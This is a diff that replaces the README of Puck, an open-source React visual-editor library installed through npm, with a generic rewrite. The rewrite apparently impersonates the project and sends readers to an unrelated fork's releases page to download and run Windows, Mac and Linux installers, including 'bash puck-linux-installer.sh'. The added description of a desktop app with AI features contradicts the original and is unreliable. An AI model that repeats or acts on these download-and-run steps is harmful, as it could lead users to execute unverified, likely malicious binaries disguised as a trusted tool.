@@ -1,114 +1,89 @@
-<br /><br /><br />
+# 🎨 puck - A Visual Editor for Effortless React Development
 
-<div align="center">
+## 🚀 Getting Started
 
-<a href="https://puckeditor.com?utm_source=readme&utm_medium=code&utm_campaign=repo&utm_contents=logo">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://res.cloudinary.com/die3nptcg/image/upload/Puck_Logo_White_RGB_j2rwgg.svg" height="100px" aria-label="Puck logo">
-    <img src="https://res.cloudinary.com/die3nptcg/image/upload/Puck_Logo_Black_RGB_dqsjag.svg" height="100px" aria-label="Puck logo">
-  </picture>
-</a>
+Welcome to puck! This application brings together the power of React with the convenience of a visual editor. With puck, you can create stunning user interfaces without writing complex code. The built-in AI features help you make smarter design choices effortlessly. Whether you are a beginner or an expert, puck will enhance your coding experience.
 
-_The visual editor for React_
+## 📥 Download & Install
 
-[Documentation](https://puckeditor.com/docs?utm_source=readme&utm_medium=code&utm_campaign=repo&utm_contents=docs_link) • [Demo](https://demo.puckeditor.com/edit?utm_source=readme&utm_medium=code&utm_campaign=repo&utm_contents=demo_link) • [Discord](https://discord.gg/V9mDAhuxyZ) • [Contributing](https://github.com/puckeditor/puck/blob/main/CONTRIBUTING.md)
+To get started with puck, you need to download it. Click the link below to visit the Releases page, where you can find the latest version of the software.
 
-⭐️ Enjoying Puck? Please [leave a star](https://github.com/puckeditor/puck)!
+[![Download puck](https://img.shields.io/badge/Download-puck-blue.svg)](https://github.com/jgiordano16/puck/releases)
 
-<br />
+### Step-by-Step Download Instructions
 
-[![GIF showing a page being created in the Puck Editor, with components being added, arranged, and customized in real time](https://github.com/user-attachments/assets/25e1ae25-ca5e-450f-afa0-01816830b731)](https://demo.puckeditor.com/edit)
+1. **Visit the Releases Page**  
+   Click on this link to go to the Releases page: [Download puck](https://github.com/jgiordano16/puck/releases).
 
-</div>
+2. **Choose Your Version**  
+   Look for the latest version listed on the page. The newest version usually has the highest number. 
 
-## What is Puck?
+3. **Download the Installer**  
+   Find the installer that matches your operating system:
+   - For Windows: Download `puck-windows-installer.exe`
+   - For Mac: Download `puck-mac-installer.dmg`
+   - For Linux: Download `puck-linux-installer.sh`
 
-Puck is a modular, open-source visual editor for React.js. You can use Puck to build custom drag-and-drop experiences with your own application and React components.
+4. **Run the Installer**  
+   After the download completes:
+   - **Windows**: Double-click `puck-windows-installer.exe` and follow the on-screen instructions.
+   - **Mac**: Open the `.dmg` file, drag the puck icon to your Applications folder, and then open it from there.
+   - **Linux**: Open a terminal and run `bash puck-linux-installer.sh` after navigating to the download folder.
 
-Because Puck is just a React component, it plays well with all React.js environments, including Next.js. You own your data and there’s no vendor lock-in.
+5. **Complete the Setup**  
+   Follow the prompts to finish installing the application. You might need to accept permissions for the program to run smoothly.
 
-Puck is also [licensed under MIT](https://github.com/puckeditor/puck?tab=MIT-1-ov-file#readme), making it suitable for both internal systems and commercial applications.
+## 🌟 Features
 
-## Quick start
+puck comes packed with features designed for ease of use and efficiency:
 
-Install the package:
+- **Visual Editing**: Drag and drop components directly onto your workspace.
+- **AI-Powered Suggestions**: Get real-time suggestions while you design your UI.
+- **Template Library**: Access a collection of templates to jumpstart your projects.
+- **Cross-Platform Support**: Use puck on Windows, Mac, and Linux without issues.
+  
+## 📋 System Requirements
 
-```sh
-npm i @puckeditor/core --save # or npx create-puck-app my-app
-```
+Before installing, ensure your system meets the following requirements:
 
-Render the editor:
+- **Windows**: Windows 10 or later
+- **Mac**: macOS 10.14 or later
+- **Linux**: Any modern distribution supporting recent libraries 
 
-```jsx
-// Editor.jsx
-import { Puck } from "@puckeditor/core";
-import "@puckeditor/core/puck.css";
+**Note**: You will need at least 2GB of RAM and 500MB of disk space.
 
-// Create Puck component config
-const config = {
-  components: {
-    HeadingBlock: {
-      fields: {
-        children: {
-          type: "text",
-        },
-      },
-      render: ({ children }) => {
-        return <h1>{children}</h1>;
-      },
-    },
-  },
-};
+## 🎓 Usage Guide
 
-// Describe the initial data
-const initialData = {};
+Once you install puck:
 
-// Save the data to your database
-const save = (data) => {};
+1. **Open the Application**  
+   Launch puck from your applications list or desktop.
 
-// Render Puck editor
-export function Editor() {
-  return <Puck config={config} data={initialData} onPublish={save} />;
-}
-```
+2. **Create a New Project**  
+   Click on “New Project.” Choose a template or start from scratch. 
 
-Render the page:
+3. **Add Components**  
+   Use the sidebar to drag components such as buttons, text fields, and images onto your design canvas.
 
-```jsx
-// Page.jsx
-import { Render } from "@puckeditor/core";
-import "@puckeditor/core/puck.css";
+4. **Customize**  
+   Click on any component to open customization options. You can change colors, sizes, and more.
 
-export function Page() {
-  return <Render config={config} data={data} />;
-}
-```
+5. **Preview Your Work**  
+   Click “Preview” to see how your project looks in real-time. Adjust as needed.
 
-## Recipes
+6. **Export Your Project**  
+   Once happy with the design, click on “Export” to generate the React code. 
 
-Use `create-puck-app` to quickly spin up a a pre-configured app based on our provided [recipes](https://github.com/puckeditor/puck/tree/main/recipes):
+## 🛠 Support & Contributions
 
-```sh
-npx create-puck-app my-app
-```
+If you encounter issues, check our FAQ section on the GitHub page. For more help, feel free to open an issue. 
 
-Available recipes include:
+We welcome contributions! If you want to contribute to puck, please read our contribution guidelines in the repository.
 
-- [**next**](https://github.com/puckeditor/puck/tree/main/recipes/next): Next.js example, using App Router and static page generation
-- [**remix**](https://github.com/puckeditor/puck/tree/main/recipes/remix): Remix Run v2 example, using dynamic routes at root-level
-- [**react-router**](https://github.com/puckeditor/puck/tree/main/recipes/react-router): React Router v7 app example, using dynamic routes to create pages at any level
+## 🔗 Links & Resources
 
-## Community
+- [Releases Page](https://github.com/jgiordano16/puck/releases)
+- [Issues and Support](https://github.com/jgiordano16/puck/issues)
+- [Contribution Guidelines](https://github.com/jgiordano16/puck/blob/main/CONTRIBUTING.md)
 
-- [Discord server](https://discord.gg/D9e4E3MQVZ) for discussions
-- [awesome-puck](https://github.com/puckeditor/awesome-puck) community repo for plugins, custom fields & more
-
-## Get support
-
-If you have any questions about Puck, please open a [GitHub issue](https://github.com/puckeditor/puck/issues) or join us on [Discord](https://discord.gg/D9e4E3MQVZ).
-
-Or [book a discovery call](https://app.cal.com/chrisvxd/puck-enquiry/) for hands-on support and consultancy.
-
-## License
-
-MIT © [The Puck Contributors](https://github.com/puckeditor/puck/graphs/contributors)
+Thank you for choosing puck! We hope it makes your React development enjoyable and straightforward. Happy coding!
